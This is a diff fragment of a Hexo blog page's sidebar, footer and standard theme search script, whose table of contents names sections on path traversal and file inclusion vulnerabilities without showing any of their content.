+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">327</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">137</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:kw120943839@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#操作文件路径"><span class="nav-number">1.</span> <span class="nav-text">操作文件路径</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#查找和利用路径遍历漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">查找和利用路径遍历漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#确定攻击目标"><span class="nav-number">1.1.1.</span> <span class="nav-text">确定攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#探查路径遍历漏洞"><span class="nav-number">1.1.2.</span> <span class="nav-text">探查路径遍历漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#避开路径攻击障碍"><span class="nav-number">1.1.3.</span> <span class="nav-text">避开路径攻击障碍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#处理定制编码"><span class="nav-number">1.1.4.</span> <span class="nav-text">处理定制编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用遍历漏洞"><span class="nav-number">1.1.5.</span> <span class="nav-text">利用遍历漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防止路径遍历漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">防止路径遍历漏洞</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件包含漏洞"><span class="nav-number">2.</span> <span class="nav-text">文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#远程文件包含"><span class="nav-number">2.1.</span> <span class="nav-text">远程文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地文件包含"><span class="nav-number">2.2.</span> <span class="nav-text">本地文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查找文件包含漏洞"><span class="nav-number">2.3.</span> <span class="nav-text">查找文件包含漏洞</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Han si</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('-1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
